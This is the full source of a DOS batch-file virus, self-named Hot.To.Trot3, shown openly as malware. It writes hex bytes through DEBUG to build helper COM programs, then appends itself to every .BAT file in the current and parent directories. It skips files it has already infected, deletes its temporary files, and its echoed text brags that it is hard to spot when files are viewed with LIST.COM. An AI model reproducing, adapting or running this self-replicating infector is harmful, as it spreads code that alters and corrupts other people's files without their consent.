@echo off
goto HotToTrot3
:To
@echo on
@echo off
echo Welcome to the Hot.To.Trot3 .BAT file virus. 1371 byte parasitic infector
echo.
echo This is the REAL .BAT file (non-infected part)  It started at the
echo @echo off that is about 4 lines above this line.
echo This it Version 3 of the Hot.To.Trot  .BAT file virus.
echo This version checks for a prior infection and will NOT re-infect a
echo .BAT file again. This was a major problem of version 0 and version 1.
echo This file is a "appending" virus (not too easy to do with .BAT files)
echo That should make it easier to hide from some snoop, by makeing a .BAT
echo file that does something, and is more than 50 lines or so.  Then infect
echo it.  The other person will have a more difficult time finding the virus
echo using the LIST.COM program (but it may be MORE apparent if the person
echo TYPE's the file to the screen).
echo Oh well, Life's a bitch :)   L8r all.
echo This is the LAST line of the original .BAT file.
goto Trot3
:HotToTrot3
if (%1==(Im goto Hot
if not exist %0.bat goto To
copy %0.bat Hot>nul
if not exist Hot goto To
echo e 100 BA 68 1 B4 3D CD '!rZ' 93 BE 82 0 B4 D 33 D2 AC 3A C4 74 12 B1 4>To
echo e 118 D3 E2 3C '9v' 4 2C 37 EB 2 ',0' 2 D0 EB E9 33 C9 'IR' F7 DA B8 2>>To
echo e 130 42 CD 21 B4 '?YQ' BA 6C 1 CD 21 B4 3E CD 21 B4 3C 33 C9 83 EA 4>>To
echo e 147 CD 21 93 59 B4 40 BA 6C 1 8B EA 3 E9 4D 80 7E 0 1A 74 1 'BI' CD>>To
echo e 15E 21 B4 3E CD 21 B8 0 4C CD '!Hot' 0>>To
echo n Babe.com>>To
echo rcx>>To
echo 6C>>To
echo w>>To
echo q>>To
echo.>>To
debug<To>nul
Babe 530>nul
echo e 100 BE 82 0 8B D6 B4 D AC 3A C4 74 2 EB F9 C6 44 FF 0 B8 0 3D CD '!r'>To
echo e 118 1D 93 B4 3F B9 1B 0 BA 42 1 CD '!r' 10 BE 55 1 B9 7 0 BF 3B 1 B8>>To
echo e 130 1 4C F3 A6 74 3 B8 0 4C CD '!ToTrot3'>>To
echo n Babe.com>>To
echo rcx>>To
echo 42>>To
echo w>>To
echo q>>To
echo.>>To
debug<To>nul
echo @echo off>To
echo goto HotToTrot3>>To
echo :To>>To
echo @echo on>>To
for %%f in (*.BAT) do call %0 Im %%f
for %%f in (..\*.BAT) do call %0 Im %%f
if exist Hot del Hot
if exist To del To
if exist Trot3 del Trot3
if exist Babe.com del Babe.Com
goto To
:Hot
for %%f in (%0.*) do if %2==%%f goto Trot3
Babe %2
if errorlevel 1 goto Trot3
copy To+%2+Hot Trot3>nul
copy Trot3 %2>nul
:Trot3
